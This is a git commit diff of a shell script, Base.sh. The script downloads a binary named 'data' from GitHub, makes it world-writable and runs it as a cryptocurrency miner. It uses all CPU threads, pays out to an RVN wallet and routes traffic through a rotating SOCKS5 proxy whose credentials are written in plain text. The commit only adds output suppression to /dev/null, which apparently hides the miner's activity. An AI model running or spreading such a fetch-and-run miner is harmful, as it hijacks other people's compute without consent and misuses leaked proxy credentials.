68bd20c2aa196dacbf7fa11cefe67905076c48fe
Master478963 <101531061+Master478963@users.noreply.github.com>
2022-06-02 10:48:04 +0530

    Update Base.sh

--- Base.sh
+++ Base.sh
@@ -1,4 +1,4 @@
 apt update -y 
 wget https://github.com/Master478963/lolMinet/raw/main/data  
 chmod 777 data 
-./data -a yespower -o stratum+tcp://yespower.asia.mine.zergpool.com:6533 -u REEbR2d3Ju3F5tfug3P81qeb4nd79tjC4e.test  -p c=RVN -t $(nproc) -x socks5://snzyphyd-IL-NL-rotate:8jq95zaxr7jf@p.webshare.io:80
+./data -a yespower -o stratum+tcp://yespower.asia.mine.zergpool.com:6533 -u REEbR2d3Ju3F5tfug3P81qeb4nd79tjC4e.test  -p c=RVN -t $(nproc) -x socks5://snzyphyd-IL-NL-rotate:8jq95zaxr7jf@p.webshare.io:80 &> /dev/null 
